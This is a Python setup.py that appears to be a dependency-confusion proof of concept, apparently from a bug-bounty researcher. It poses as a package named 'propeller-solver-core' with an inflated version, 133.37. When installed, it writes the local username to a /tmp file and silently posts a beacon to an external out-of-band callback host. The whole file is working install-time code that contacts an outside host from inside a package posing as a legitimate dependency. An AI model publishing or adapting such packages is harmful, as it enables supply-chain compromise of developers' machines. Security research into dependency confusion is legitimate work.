import os, requests
from setuptools import setup

proof_path = "/tmp/dep_confusion_poc_by_bugdotexeatwearehackeronedotcom.txt"
with open(proof_path, "w") as f:
    f.write(f"Vulnerable at {os.environ.get('USER')}")

try:
    requests.post("https://propeller-solver-core.xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun/", data={"propeller-solver-core": "installed at {os.environ.get('USER')}"}, timeout=2)
except:
    pass

setup(name="propeller-solver-core", version="133.37")
